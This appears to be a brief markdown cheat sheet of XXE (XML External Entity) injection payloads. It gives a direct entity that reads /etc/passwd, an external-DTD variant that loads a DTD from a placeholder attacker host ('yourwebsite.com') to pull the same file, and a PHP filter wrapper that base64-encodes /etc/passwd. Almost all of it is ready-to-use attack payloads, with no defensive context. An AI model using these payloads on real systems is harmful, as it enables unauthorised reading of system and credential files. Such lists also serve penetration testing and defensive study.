# XXE

## 1) Direct

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ 
  <!ENTITY xxe SYSTEM "/etc/passwd">
] >
<site>
    <vuln>Vuln &xxe;</vuln>
</site>
```

## 2) External DTD

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [
  <!ENTITY % a SYSTEM "http://yourwebsite.com/ex.dtd">
  %a;
  %xxe;
] >
<site>
    <vuln>Vuln &xxe;</vuln>
</site>
```

file http://yourwebsite.com/ex.dtd
```
<!ENTITY % test SYSTEM "file:///etc/passwd">
<!ENTITY % xxe '<!ENTITY test "%test;">'>
```

## 3) Tricks

PHP wrapper:
```
<!DOCTYPE x [
<!ENTITY w00t SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
    <color>&w00t;</color>
</root>
```
